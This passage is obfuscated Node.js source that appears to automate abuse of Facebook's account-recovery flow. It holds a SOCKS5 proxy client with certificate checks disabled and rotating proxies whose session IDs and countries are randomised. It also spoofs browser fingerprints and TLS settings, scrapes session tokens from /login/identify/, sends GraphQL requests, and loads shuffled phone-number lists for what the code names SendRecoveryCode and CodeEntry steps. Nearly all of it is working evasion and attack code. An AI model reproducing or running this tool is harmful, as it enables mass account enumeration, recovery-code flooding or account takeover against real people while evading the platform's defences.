        v520 = Buffer.concat([Buffer.from([0x5, v519.length]), Buffer.from(v519)]);
      v516.write(v520);
    });
    v515 = setTimeout(() => {
      v516.destroy();
      v514(new Error("SOCKS5 TCP timeout (" + v510.host + ':' + v510.port + ')'));
    }, 0x2710);
    let v517 = "greeting",
      v518 = Buffer.alloc(0x0);
    const fn9 = v521 => {
        v518 = Buffer.concat([v518, v521]);
        if (v517 === "greeting") {
          if (v518.length < 0x2) return;
          const v522 = v518[0x0],
            v523 = v518[0x1];
          v518 = v518.slice(0x2);
          if (v522 !== 0x5) {
            if (v515) clearTimeout(v515);
            return v516.destroy(), v514(new Error("Invalid SOCKS version: " + v522));
          }
          if (v523 === 0x2) {
            v517 = "auth";
            const v524 = Buffer.from(v510.user, "utf8"),
              v525 = Buffer.from(v510.pass || '', "utf8"),
              v526 = Buffer.concat([Buffer.from([0x1, v524.length]), v524, Buffer.from([v525.length]), v525]);
            v516.write(v526);
          } else {
            if (v523 === 0x0) fn10();else {
              if (v515) clearTimeout(v515);
              return v516.destroy(), v514(new Error("Unsupported SOCKS auth method: " + v523));
            }
          }
        } else {
          if (v517 === "auth") {
            if (v518.length < 0x2) return;
            const v527 = v518[0x1];
            v518 = v518.slice(0x2);
            if (v527 !== 0x0) {
              if (v515) clearTimeout(v515);
              return v516.destroy(), v514(new Error("SOCKS authentication failed"));
            }
            fn10();
          } else {
            if (v517 === "connect") {
              if (v518.length < 0x4) return;
              const v528 = v518[0x1],
                v529 = v518[0x3];
              let v530 = 0x4;
              if (v529 === 0x1) v530 += 6;else {
                if (v529 === 0x3) {
                  if (v518.length < 0x5) return;
                  v530 += 0x1 + v518[0x4] + 0x2;
                } else {
                  if (v529 === 0x4) v530 += 18;else {
                    if (v515) clearTimeout(v515);
                    return v516.destroy(), v514(new Error("Unsupported SOCKS atyp: " + v529));
                  }
                }
              }
              if (v518.length < v530) return;
              v518 = v518.slice(v530);
              if (v528 !== 0x0) {
                if (v515) clearTimeout(v515);
                return v516.destroy(), v514(new Error("SOCKS connection failed with code: " + v528));
              }
              if (v515) clearTimeout(v515);
              v516.removeListener("data", fn9), v516.removeListener("error", fn11);
              if (v518.length > 0x0) v516.unshift(v518);
              const v531 = {};
              v531.socket = v516, v531.servername = v513.host, v531.rejectUnauthorized = false;
              const v532 = tls.connect(v531);
              v532.on("error", v533 => {
                v514(v533);
              }), v514(null, v532);
            }
          }
        }
      },
      fn10 = () => {
        v517 = "connect";
        const v534 = Buffer.from(v513.host, "utf8"),
          v535 = Buffer.alloc(0x2);
        v535.writeUInt16BE(v513.port, 0x0);
        const v536 = Buffer.concat([Buffer.from([0x5, 0x1, 0x0, 0x3, v534.length]), v534, v535]);
        v516.write(v536);
      },
      fn11 = v537 => {
        if (v515) clearTimeout(v515);
        v516.destroy(), v514(v537);
      };
    v516.on("data", fn9), v516.on("error", fn11);
  }, v512;
}
class ProxyManager {
  constructor() {
    this.proxies = [], this.rawLines = [], this.index = 0x0;
    this.failureCounts = {}, this.deadProxies = new Set(), this.reviveDeadAt = {}, this.autoCountry = true, this.proxyHits = 0x0;
    this.proxyErrors = 0x0;
    setInterval(() => {
      const v538 = Date.now();
      for (const [v539, v540] of Object.entries(this.reviveDeadAt)) {
        v538 >= v540 && (this.deadProxies.delete(Number(v539)), this.failureCounts[v539] = 0x0, delete this.reviveDeadAt[v539]);
      }
    }, 0xea60).unref();
  }
  get ["hasProxies"]() {
    return this.proxies.length > 0x0;
  }
  ["clear"]() {
    {
      this.proxies = [];
      this.rawLines = [];
      this.index = 0x0;
      this.failureCounts = {};
      this.deadProxies.clear();
      this.reviveDeadAt = {};
    }
  }
  ["load"](v541) {
    if (!v541) return;
    let v542 = [];
    if (fs.existsSync(v541)) v542 = fs.readFileSync(v541, "utf8").split(/\r?\n/).map(v543 => v543.trim()).filter(v544 => v544 && !v544.startsWith('#'));else v541.includes(':') && (v542 = [v541]);
    this.rawLines = v542, this.proxies = [];
    for (const v545 of v542) {
      const v546 = parseProxy(v545);
      !v546 && (console.error(R("\n  ✗ Invalid proxy format detected: \"" + v545 + '\x22')), console.error(R("  Please use one of the supported formats:")), console.error(R("    - host:port")), console.error(R("    - user:pass@host:port")), console.error(R("    - host:port:user:pass")), console.error(R("    - user:pass:host:port\n")), process.exit(0x1)), this.proxies.push(v546);
    }
    if (this.proxies.length) console.log(G("  Proxies loaded: " + Y(this.proxies.length)));
  }
  ["getNext"](v547 = null) {
    if (!this.proxies.length) return null;
    const v548 = this.proxies.map((v553, v554) => ({
      'p': v553,
      'i': v554
    })).filter(({
      i: v555
    }) => !this.deadProxies.has(v555));
    const v549 = v548.length ? v548 : this.proxies.map((v556, v557) => ({
        'p': v556,
        'i': v557
      })),
      v550 = v549[this.index % v549.length];
    this.index++;
    const v551 = {
      ...v550.p
    };
    const v552 = v551;
    v552.user && (v552.user = v552.user.replace(/-session-[A-Za-z0-9_]+/, "-session-" + randomSessionId()).replace(/-ssid-[A-Za-z0-9_]+/, "-ssid-" + randomSessionId()).replace(/_sid_[A-Za-z0-9]+/, "_sid_" + randomSessionId()).replace(/_SESSID_[A-Za-z0-9]+/i, "_SESSID_" + randomSessionId()));
    if (this.autoCountry && v547 && v552.user) {
      const v558 = detectCountry(v547);
      if (v558) {
        const v559 = v558.toLowerCase();
        if (/-country-[a-z]{2}/i.test(v552.user)) v552.user = v552.user.replace(/(-country-)[a-z]{2}/i, '$1' + v559);else {
          if (/_country_[a-z]{2}/i.test(v552.user)) v552.user = v552.user.replace(/(_country_)[a-z]{2}/i, '$1' + v559);else {
            if (/-cc-[a-z]{2}/i.test(v552.user)) v552.user = v552.user.replace(/(-cc-)[a-z]{2}/i, '$1' + v559);else {
              if (/_cc_[a-z]{2}/i.test(v552.user)) v552.user = v552.user.replace(/(_cc_)[a-z]{2}/i, '$1' + v559);else /-zone-[a-z]{2}/i.test(v552.user) && (v552.user = v552.user.replace(/(-zone-)[a-z]{2}/i, '$1' + v559));
            }
          }
        }
      }
    }
    return v552;
  }
  ["recordSuccess"](v560) {
    this.proxyHits++;
  }
  ["recordFailure"](v561) {
    this.proxyErrors++;
    const v562 = v561 % this.proxies.length;
    this.failureCounts[v562] = (this.failureCounts[v562] || 0x0) + 0x1, this.failureCounts[v562] >= 0x5 && (this.deadProxies.add(v562), this.reviveDeadAt[v562] = Date.now() + 180000, dbg("[PROXY] Marked proxy #" + v562 + " dead, will revive at " + new Date(this.reviveDeadAt[v562]).toISOString()));
  }
  ["getStatus"]() {
    const v563 = this.proxies.length - this.deadProxies.size;
    return v563 + '/' + this.proxies.length + " alive" + (this.autoCountry ? " · Auto-Country" : '');
  }
  ["toUrl"](v564) {
    const v565 = v564.user ? encodeURIComponent(v564.user) + ':' + encodeURIComponent(v564.pass || '') + '@' : '';
    return (v564.type === "socks5" ? "socks5" : "http") + "://" + v565 + v564.host + ':' + v564.port;
  }
  async ["testConnectivity"]() {
    if (!this.hasProxies) return true;
    console.log(C("  ── Proxy Connectivity Test (" + this.proxies.length + " proxies) ──"));
    let v566 = 0x0,
      v567 = 0x0;
    const fn12 = async (v568, v569) => {
      try {
        let v570;
        const v571 = new Promise((v573, v574) => {
            v570 = setTimeout(() => v574(new Error("timeout")), 0x2ee0);
          }),
          v572 = await Promise.race([httpsGetPage("/login/identify/", '', 0x2ee0, "www.facebook.com", v568, internalUA), v571]);
        clearTimeout(v570);
        if (v572.status >= 0xc8 && v572.status < 0x190) {
          v566++;
          return;
        }
        throw new Error("HTTP " + v572.status);
      } catch (v575) {
        this.deadProxies.add(v569), v567++;
      }
    };
    await Promise.all(this.proxies.map((v576, v577) => fn12(v576, v577))), console.log("  ── Result: " + G(v566 + " alive") + " / " + R(v567 + " dead") + " out of " + this.proxies.length + " proxies ──");
    if (v566 === 0x0) return console.log(R("  All proxies are dead.")), false;
    console.log(B("  ✓ " + v566 + " proxy/proxies ready. Dead proxies excluded from run."));
    return true;
  }
}
const proxyManager = new ProxyManager();
function getProxy(v578) {
  return proxyManager.getNext(v578);
}
function randomSessionId() {
  return crypto.randomBytes(0x6).toString("hex");
}
function getTimezoneOffset(v579) {
  return COUNTRY_TIMEZONE_OFFSETS[v579] !== undefined ? COUNTRY_TIMEZONE_OFFSETS[v579] : 0x0;
}
function extractProxyCountry(v580) {
  if (!v580 || !v580.user) return null;
  const v581 = v580.user.match(/[-_](?:country|zone|cc)[-_]([A-Za-z]{2})/i);
  return v581 ? v581[0x1].toUpperCase() : null;
}
function resolveTimezone(v582, v583) {
  const v584 = detectCountry(v583);
  if (v584 && COUNTRY_TIMEZONE_OFFSETS[v584] !== undefined) return COUNTRY_TIMEZONE_OFFSETS[v584];
  const v585 = extractProxyCountry(v582);
  if (v585 && COUNTRY_TIMEZONE_OFFSETS[v585] !== undefined) return COUNTRY_TIMEZONE_OFFSETS[v585];
  return 0x0;
}
function proxyHttpsRequestSingle(v586, v587, v588, v589 = 0x3a98) {
  return new Promise((v590, v591) => {
    let v592;
    try {
      v586.type === "socks5" ? v592 = createSocks5ProxyAgent(v586) : v592 = createHttpProxyAgent(v586);
    } catch (v596) {
      return v591(new Error("Proxy agent init failed: " + v596.message));
    }
    const v593 = v588 || '',
      v594 = {
        'hostname': v587.hostname,
        'port': 0x1bb,
        'path': v587.path,
        'method': v587.method || "GET",
        'headers': {
          ...v587.headers,
          'Host': v587.hostname
        },
        'agent': v592,
        'timeout': v589,
        'ciphers': "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA",
        'ecdhCurve': "X25519:P-256:P-384",
        'honorCipherOrder': false,
        'secureOptions': require("crypto").constants.SSL_OP_NO_SSLv3 | require("crypto").constants.SSL_OP_NO_TLSv1 | require("crypto").constants.SSL_OP_NO_TLSv1_1
      };
    if (v593) v594.headers["Content-Length"] = Buffer.byteLength(v593);
    dbg("[PROXY REQUEST] → http://" + v586.host + ':' + v586.port + " | " + v587.hostname + v587.path);
    const v595 = https.request(v594, v597 => {
      const v598 = [];
      v597.on("data", v599 => {
        v598.push(v599);
        trackBytes(v599.length);
      });
      v597.on("error", v600 => {
        try {
          v591(v600);
        } catch (v601) {}
      }), v597.on("end", () => {
        dbg("[PROXY RESPONSE] HTTP " + v597.statusCode + " from " + v586.host + ':' + v586.port);
        let v602 = Buffer.concat(v598);
        const v603 = (v597.headers["content-encoding"] || '').trim().toLowerCase();
        try {
          if (v603.includes('br')) v602 = zlib.brotliDecompressSync(v602);else {
            if (v603.includes("gzip")) v602 = zlib.gunzipSync(v602);else {
              if (v603.includes("deflate")) v602 = zlib.inflateSync(v602);else {
                if (v603.includes("zstd") || v602.length >= 0x4 && v602[0x0] === 0x28 && v602[0x1] === 0xb5 && v602[0x2] === 0x2f && v602[0x3] === 0xfd) {
                  dbg("[WARN] ZSTD response from " + v586.host + ':' + v586.port + " (enc=\"" + v603 + "\") — rotating proxy");
                  const v604 = new Error("ZSTD_ENCODING");
                  return v604.code = "ZSTD_ENCODING", v591(v604);
                } else {
                  if (v603 && v603 !== "identity") {
                    const v605 = v602.slice(0x0, 0x78).toString("hex");
                    dbg("[WARN] Unknown content-encoding: \"" + v603 + "\" from " + v586.host + ':' + v586.port + " — body[0..120]=" + v605);
                  }
                }
              }
            }
          }
        } catch (v606) {
          dbg("[WARN] Decompression failed (" + v603 + "): " + v606.message);
        }
        if (v597.statusCode >= 0x1f6 && v597.statusCode <= 0x1f8) return v591(new Error("Proxy server returned HTTP " + v597.statusCode));
        (v597.statusCode === 0x12d || v597.statusCode === 0x12e) && v587.method === "POST" && dbg("[WARN] POST " + v587.hostname + v587.path + " returned " + v597.statusCode + " → " + (v597.headers.location || "no location") + " (session invalidated or proxy intercept)");
        v590({
          'status': v597.statusCode,
          'data': v602.toString(),
          'location': v597.headers.location || null,
          'encoding': v603 || null,
          'headers': v597.headers
        });
      });
    });
    v595.on("error", v607 => {
      v591(v607);
    }), v595.on("timeout", () => {
      v595.destroy();
      v591(new Error("timeout"));
    }), v593 && (trackBytes(v593.length), v595.write(v593)), v595.end();
  });
}
async function proxyHttpsRequest(v608, v609, v610, v611 = 0x3a98) {
  return proxyHttpsRequestSingle(v608, v609, v610, v611);
}
function ask(v612) {
  const v613 = {};
  v613.input = process.stdin, v613.output = process.stdout;
  const v614 = readline.createInterface(v613);
  return new Promise(v615 => {
    v614.question(v612, v616 => {
      v614.close();
      v615(v616.trim());
    });
  });
}
function httpsGetPage(v617, v618, v619 = 0x3a98, v620 = null, v621 = undefined, v622 = null) {
  const v623 = v620 || FB_HOST,
    v624 = v621 === undefined ? getProxy() : v621,
    v625 = v622 || globalUA;
  if (v624) {
    const v626 = {};
    return v626.hostname = v623, v626.path = v617, v626.method = "GET", v626.headers = {
      'Cookie': v618,
      'User-Agent': v625.userAgent,
      'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
      'Accept-Language': "en-US,en;q=0.9",
      'Accept-Encoding': "gzip, deflate, br",
      'Referer': "https://" + v623 + "/login/identify/",
      'Upgrade-Insecure-Requests': '1',
      ...v625.clientHints
    }, v626.headers["sec-fetch-dest"] = "document", v626.headers["sec-fetch-mode"] = "navigate", v626.headers["sec-fetch-site"] = "same-origin", v626.headers["sec-fetch-user"] = '?1', proxyHttpsRequest(v624, v626, null, v619).then(v627 => {
      if (v627.status >= 0x12c && v627.status < 0x190 && v627.location) {
        let v629 = v627.location;
        if (v629.startsWith('/')) return httpsGetPage(v629, v618, v619, v623, v624, v625);
        try {
          const v631 = new URL(v629);
          if (v631.hostname.includes("facebook.com")) return httpsGetPage(v631.pathname + v631.search, v618, v619, v631.hostname, v624, v625);
        } catch (v632) {}
        const v630 = {};
        return v630.status = v627.status, v630.redirect = v629, v630.headers = v627.headers || {}, v630;
      }
      const v628 = {};
      v628.status = v627.status;
      return v628.data = v627.data, v628.headers = v627.headers || {}, v628;
    });
  }
  return new Promise((v633, v634) => {
    const v635 = {};
    v635.keepAlive = false;
    const v636 = {
        'hostname': v623,
        'port': 0x1bb,
        'path': v617,
        'method': "GET",
        'timeout': v619,
        'agent': new https.Agent(v635),
        'headers': {
          'Cookie': v618,
          'User-Agent': v625.userAgent,
          'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
          'Accept-Language': v622 && v622.hostCtx ? v622.hostCtx.lang : "en-US,en;q=0.9",
          'Accept-Encoding': "gzip, deflate, br",
          'Referer': "https://" + v623 + "/login/identify/",
          'Upgrade-Insecure-Requests': '1',
          ...v625.clientHints,
          'sec-fetch-dest': "document",
          'sec-fetch-mode': "navigate",
          'sec-fetch-site': "same-origin",
          'sec-fetch-user': '?1'
        }
      },
      v637 = https.request(v636, v638 => {
        if (v638.statusCode >= 0x12c && v638.statusCode < 0x190 && v638.headers.location) {
          let v640 = v638.headers.location;
          v638.resume();
          if (v640.startsWith('/')) return httpsGetPage(v640, v618, v619, v623, v621, v625).then(v633).catch(v634);
          try {
            const v642 = new URL(v640);
            if (v642.hostname.includes("facebook.com")) return httpsGetPage(v642.pathname + v642.search, v618, v619, v642.hostname, v621, v625).then(v633).catch(v634);
          } catch (v643) {}
          const v641 = {};
          return v641.status = v638.statusCode, v641.redirect = v640, v633(v641);
        }
        const v639 = [];
        v638.on("data", v644 => v639.push(v644)), v638.on("error", v645 => {
          try {
            v634(v645);
          } catch (v646) {}
        }), v638.on("end", () => {
          let v647 = Buffer.concat(v639);
          if (v638.headers["content-encoding"] === "gzip") try {
            v647 = zlib.gunzipSync(v647);
          } catch (v648) {} else {
            if (v638.headers["content-encoding"] === "deflate") try {
              v647 = zlib.inflateSync(v647);
            } catch (v649) {} else {
              if (v638.headers["content-encoding"] === 'br') try {
                v647 = zlib.brotliDecompressSync(v647);
              } catch (v650) {}
            }
          }
          v633({
            'status': v638.statusCode,
            'data': v647.toString(),
            'headers': v638.headers
          });
        });
      });
    v637.on("error", v634), v637.on("timeout", () => {
      v637.destroy(), v634(new Error("timeout"));
    }), v637.end();
  });
}
function graphqlPost(v651, v652, v653 = 0x3a98, v654 = undefined, v655 = "www.facebook.com") {
  const v656 = v654 === undefined ? getProxy() : v654;
  const v657 = v655 || "www.facebook.com";
  if (v656) {
    const v658 = {
        ...v652
      },
      v659 = {};
    return v659.hostname = v657, v659.path = "/api/graphql/", v659.method = "POST", v659.headers = v658, proxyHttpsRequest(v656, v659, v651.toString(), v653);
  }
  return new Promise((v660, v661) => {
    const v662 = v651.toString();
    const v663 = {};
    v663.keepAlive = false;
    const v664 = {
        'hostname': v657,
        'port': 0x1bb,
        'path': "/api/graphql/",
        'method': "POST",
        'headers': {
          ...v652,
          'Content-Length': Buffer.byteLength(v662),
          'Accept-Encoding': "gzip, deflate, br"
        },
        'timeout': v653,
        'agent': new https.Agent(v663)
      },
      v665 = https.request(v664, v666 => {
        const v667 = [];
        v666.on("data", v668 => {
          v667.push(v668);
          trackBytes(v668.length);
        }), v666.on("error", v669 => {
          try {
            v661(v669);
          } catch (v670) {}
        }), v666.on("end", () => {
          let v671 = Buffer.concat(v667);
          const v672 = v666.headers["content-encoding"];
          if (v672 === "gzip") try {
            v671 = zlib.gunzipSync(v671);
          } catch (v673) {} else {
            if (v672 === "deflate") try {
              v671 = zlib.inflateSync(v671);
            } catch (v674) {} else {
              if (v672 === 'br') try {
                v671 = zlib.brotliDecompressSync(v671);
              } catch (v675) {}
            }
          }
          v660({
            'status': v666.statusCode,
            'data': v671.toString(),
            'headers': v666.headers
          });
        });
      });
    v665.on("error", v661), v665.on("timeout", () => {
      v665.destroy();
      v661(new Error("timeout"));
    }), trackBytes(v662.length), v665.write(v662);
    v665.end();
  });
}
async function seedSession(v676 = null, v677 = null, v678 = null, v679 = () => {}) {
  return new Promise((v680, v681) => {
    const v682 = v677 || globalUA;
    const v683 = v676 === undefined ? proxyManager.hasProxies ? proxyManager.getNext() : null : v676,
      v684 = v678 || {
        'host': SELECTED_BROWSER === "via_browser" || SELECTED_BROWSER === "mweb_pixel8" ? "m.facebook.com" : "www.facebook.com",
        'locale': "en_US",
        'lang': "en-US,en;q=0.9"
      };
    if (v683) {
      const v685 = SELECTED_BROWSER === "via_browser" || SELECTED_BROWSER === "mweb_pixel8" ? "m.facebook.com" : v684.host,
        fn14 = (v686, v687, v688) => {
          const v689 = {};
          v689.hostname = v686;
          v689.path = v687, v689.method = "GET", v689.headers = {
            'User-Agent': v682.userAgent,
            'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            'Accept-Language': v684.lang,
            'Accept-Encoding': "gzip, deflate, br",
            'Referer': "https://" + v686 + "/login/identify/",
            'Upgrade-Insecure-Requests': '1',
            ...v682.clientHints
          }, v689.headers["sec-fetch-dest"] = "document", v689.headers["sec-fetch-mode"] = "navigate";
          v689.headers["sec-fetch-site"] = "same-origin", v689.headers["sec-fetch-user"] = '?1', proxyHttpsRequest(v683, v689, null, 0x3a98).then(v690 => {
            if ((v690.status === 0x12d || v690.status === 0x12e) && v690.location && v688 > 0x0) {
              let v691 = v686,
                v692 = v690.location;
              if (v690.location.startsWith("http")) try {
                const v693 = new URL(v690.location);
                v691 = v693.hostname, v692 = v693.pathname + v693.search;
              } catch (v694) {}
              fn14(v691, v692, v688 - 0x1);
            } else v684.host = v686, fn13(v690.data, v690.status, v690.headers);
          }).catch(v695 => {
            if (v695 && v695.code === "ZSTD_ENCODING" && proxyManager.hasProxies) {
              dbg("[SEED] ZSTD proxy " + v683.host + ':' + v683.port + " — rotating and retrying seed");
              const v696 = proxyManager.getNext();
              v696 && v696.host !== v683.host ? seedSession(v696, v677, v678, v679).then(v680).catch(v681) : v681(new Error("All proxies return zstd — cannot seed session"));
            } else v681(v695);
          });
        };
      fn14(v685, "/login/identify/", 0x5);
    } else {
      const v697 = SELECTED_BROWSER === "via_browser" || SELECTED_BROWSER === "mweb_pixel8" ? "m.facebook.com" : v684.host,
        fn15 = (v698, v699, v700) => {
          const v701 = {};
          v701.hostname = v698;
          v701.port = 0x1bb, v701.path = v699;
          v701.method = "GET", v701.headers = {
            'User-Agent': v682.userAgent,
            'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            'Accept-Language': v684.lang,
            'Accept-Encoding': "gzip, deflate, br",
            'Referer': "https://" + v698 + "/login/identify/",
            'Upgrade-Insecure-Requests': '1',
            'connection': "keep-alive",
            ...v682.clientHints
          }, v701.timeout = 0x3a98, v701.headers["sec-fetch-dest"] = "document", v701.headers["sec-fetch-mode"] = "navigate";
          v701.headers["sec-fetch-site"] = "same-origin", v701.headers["sec-fetch-user"] = '?1';
          const v702 = v701,
            v703 = https.request(v702, v704 => {
              if ((v704.statusCode === 0x12d || v704.statusCode === 0x12e) && v704.headers.location && v700 > 0x0) {
                v704.resume();
                let v705 = v698,
                  v706 = v704.headers.location;
                if (v704.headers.location.startsWith("http")) try {
                  const v707 = new URL(v704.headers.location);
                  v705 = v707.hostname, v706 = v707.pathname + v707.search;
                } catch (v708) {}
                fn15(v705, v706, v700 - 0x1);
              } else {
                const v709 = [];
                v704.on("data", v710 => v709.push(v710)), v704.on("error", v711 => {
                  try {
                    v681(v711);
                  } catch (v712) {}
                }), v704.on("end", () => {
                  let v713 = Buffer.concat(v709);
                  const v714 = v704.headers["content-encoding"];
                  if (v714 === "gzip") try {
                    v713 = zlib.gunzipSync(v713);
                  } catch (v715) {} else {
                    if (v714 === "deflate") try {
                      v713 = zlib.inflateSync(v713);
                    } catch (v716) {} else {
                      if (v714 === 'br') try {
                        v713 = zlib.brotliDecompressSync(v713);
                      } catch (v717) {}
                    }
                  }
                  v684.host = v698;
                  fn13(v713.toString(), v704.statusCode, v704.headers);
                });
              }
            });
          v703.on("timeout", () => {
            v703.destroy();
            v681(new Error("Timeout seeding session"));
          }), v703.on("error", v718 => {
            v681(v718);
          }), v703.end();
        };
      fn15(v697, "/login/identify/", 0x5);
    }
    function fn13(v719, v720, v721 = {}) {
      if (v720 !== 0xc8) {
        v681(new Error("Session seed HTTP " + v720));
        return;
      }
      if (v719 && v719.length > 0x0 && v719.charCodeAt(0x0) < 0x20 && v719.charCodeAt(0x0) !== 0xa && v719.charCodeAt(0x0) !== 0xd) {
        dbg("[SEED] Binary/undecoded response body (first byte 0x" + v719.charCodeAt(0x0).toString(0x10) + ") — possible zstd from proxy. Rejecting."), v681(new Error("BINARY_BODY"));
        return;
      }
      const v722 = {},
        v723 = v721["set-cookie"] || v721["Set-Cookie"];
      if (v723) {
        const v727 = Array.isArray(v723) ? v723 : [v723];
        v727.forEach(v728 => {
          const v729 = v728.split(';')[0x0].split('=');
          if (v729.length >= 0x2) {
            const v730 = v729[0x0].trim(),
              v731 = v729.slice(0x1).join('=').trim();
            v722[v730] = v731;
          }
        });
      }
      SELECTED_BROWSER === "via_browser" && (v722.m_pixel_ratio = "2.625", v722.wd = "412x732");
      if (SELECTED_BROWSER === "mweb_pixel8") {
        const v732 = {};
        v732.w = 0x19c, v732.h = 0x393, v732.dpr = 2.625;
        const v733 = v682 && v682.hw ? v682.hw : v732;
        v722.m_pixel_ratio = String(v733.dpr), v722.wd = v733.w + 'x' + v733.h, v722.dpr = String(v733.dpr), v722.ps_l = '1', v722.ps_n = '1';
      }
      (SELECTED_BROWSER === "duckduckgo" || v682?.["browserType"] === "duckduckgo") && (v722.wd = "1920x941", v722.ps_l = '1', v722.ps_n = '1');
      if (v719 && v719.includes("datr")) {
        const v734 = v719.match(/"datr":"([^"]+)"/);
        if (v734) v722.datr = v734[0x1];
      }
      !v722.datr && (v722.datr = Math.random().toString(0x24).substring(0x2, 0xf) + Math.random().toString(0x24).substring(0x2, 0xf));
      const fn16 = v735 => {
          const v736 = v719.match(v735);
          return v736 ? v736[0x1] : '';
        },
        v724 = {};
      v724.lsd = fn16(/"LSD",\[\],\{"token":"([^"]+)"/) || fn16(/name="lsd"\s+value="([^"]+)"/) || fn16(/"token":"([^"]+)"/) || fn16(/\"lsd\":\{\"token\":\"([^"]+)\"/), v724.hsi = fn16(/"hsi":"(\d+)"/) || fn16(/"hsi":(\d+)/) || String(Math.floor(Date.now())), v724.rev = fn16(/"server_revision":(\d+)/) || "1046836583", v724.fb_dtsg = fn16(/"dtsg":\{"token":"([^"]+)"/) || fn16(/name="fb_dtsg" value="([^"]+)"/) || '';
      v724.spinB = fn16(/"__spin_b":"([^"]+)"/) || "trunk", v724.spinT = fn16(/"__spin_t":(\d+)/) || String(Math.floor(Date.now() / 0x3e8)), v724.__hs = fn16(/"__hs":"([^"]+)"/) || "20700.HYP:comet_loggedout_pkg.2.1...0", v724.__comet_req = fn16(/"__comet_req":(\d+)/) || '15', v724.__ccg = fn16(/"__ccg":"([^"]+)"/) || "EXCELLENT", v724.__dyn = fn16(/"__dyn":"([^"]+)"/) || '', v724.__csr = fn16(/"__csr":"([^"]+)"/) || '', v724.hsi = v724.hsi || fn16(/"hsi":(\d+)/) || '0', v724.__s = fn16(/"__s":"([^"]+)"/) || fn16(/"session_id":"([^"]+)"/) || '', v724.initialCipher = fn16(/"cipher_text"\s*:\s*"([^"]+)"/) || fn16(/\\"cipher_text\\"\s*:\s*\\"([^"\\]+)\\"/) || fn16(/"cipher"\s*:\s*"([^"]+)"/) || fn16(/\\"cipher\\"\s*:\s*\\"([^"\\]+)\\"/) || fn16(/"ci":"([^"]+)"/) || fn16(/[?&]ci=([A-Za-z0-9_\-]+)/) || fn16(/(Ad[A-Za-z0-9_\-]{50,})/) || '', v724.contextData = fn16(/"context_data"\s*:\s*"([^"]+)"/) || fn16(/context_data\\":\\"([^"\\]+)\\"/) || fn16(/(Ad[A-Za-z0-9_\-]{40,}\|arm)/) || '', v724.__hsdp = fn16(/"__hsdp":"([^"]+)"/) || '', v724.__hblp = fn16(/"__hblp":"([^"]+)"/) || '', v724.__sjsp = fn16(/"__sjsp":"([^"]+)"/) || '', dbg("[SESSION] lsd=" + (v724.lsd ? '✓' : '✗') + " rev=" + v724.rev + " hs=" + v724.__hs + " dtsg=" + (v724.fb_dtsg ? '✓' : '✗') + " ctxData=" + (v724.contextData ? '✓' : '✗'));
      if (!v724.lsd) {
        v681(new Error("Failed to initialize session"));
        return;
      }
      let v725 = 0x0;
      const v726 = v724.lsd || '';
      for (let v737 = 0x0; v737 < v726.length; v737++) v725 += v726.charCodeAt(v737);
      v680({
        ...v724,
        'jazoest': '2' + v725,
        'cookies': v722,
        'cookieHeader': Object.entries(v722).map(([v738, v739]) => v738 + '=' + v739).join(';\x20'),
        'hostCtx': v684,
        'uaData': v682
      });
    }
  });
}
const sessionPool = new Map(),
  SESSION_TTL_MS = 120000;
function getProxyCacheKey(v740, v741, v742) {
  const v743 = v740 ? v740.type + "://" + v740.host + ':' + v740.port : "direct";
  const v744 = v741 ? !!v741.isMobile : SELECTED_BROWSER === "ios" || SELECTED_BROWSER === "android" || SELECTED_BROWSER === "samsung" || SELECTED_BROWSER === "mweb_pixel8" || SELECTED_BROWSER === "via_browser";
  const v745 = v744 ? "mobile" : "desktop",
    v746 = v742 && v742.host || "www.facebook.com";
  return v743 + '|' + v745 + '|' + v746;
}
function invalidateSessionCache(v747, v748, v749) {
  const v750 = getProxyCacheKey(v747, v748, v749);
  sessionPool.delete(v750);
}
async function getOrSeedSession(v751 = null, v752 = null, v753 = null, v754 = () => {}) {
  const v755 = getProxyCacheKey(v751, v752, v753);
  const v756 = sessionPool.get(v755),
    v757 = Date.now();
  if (v756 && v757 - v756.createdAt < SESSION_TTL_MS && v756.uses < 0x3) {
    v756.uses++;
    const fn17 = () => Math.random().toString(0x24).slice(0x2, 0x9),
      v760 = fn17() + ':' + fn17() + ':' + fn17(),
      v761 = Object.assign({}, v756.session.cookies),
      v762 = {
        ...v756.session,
        'cookies': v761,
        '__s': v760,
        '__s_code': null,
        '__req': (v756.session.__req || 0xa) + v756.uses * 0x3
      };
    return v762.cookieHeader = Object.entries(v762.cookies).map(([v763, v764]) => v763 + '=' + v764).join(';\x20'), dbg("[SESSION POOL] Reusing warm session (" + v756.uses + '/' + 0x3 + ", age " + Math.round((v757 - v756.createdAt) / 0x3e8) + "s) __s=" + v760), v762;
  }
  const v758 = await seedSession(v751, v752, v753, v754),
    v759 = {};
  v759.session = v758, v759.createdAt = v757;
  v759.uses = 0x1;
  return sessionPool.set(v755, v759), v758;
}
function loadNumbers(v765) {
  (!v765 || !fs.existsSync(v765)) && process.exit(0x1);
  const v766 = fs.readFileSync(v765, "utf8").split(/\r?\n/).map(v767 => v767.trim()).filter(v768 => v768 && /^\+?\d{7,15}$/.test(v768));
  for (let v769 = v766.length - 0x1; v769 > 0x0; v769--) {
    const v770 = Math.floor(Math.random() * (v769 + 0x1));
    [v766[v769], v766[v770]] = [v766[v770], v766[v769]];
  }
  return v766;
}
function buildParams(v771, v772, v773, v774, v775, v776, v777 = null) {
  const v778 = v777 && v777.includes("CodeEntry"),
    v779 = v777 && v777.includes("InitiateView") || v773 && (v773.includes("InitiateView") || v773.includes("SendRecoveryCode")),
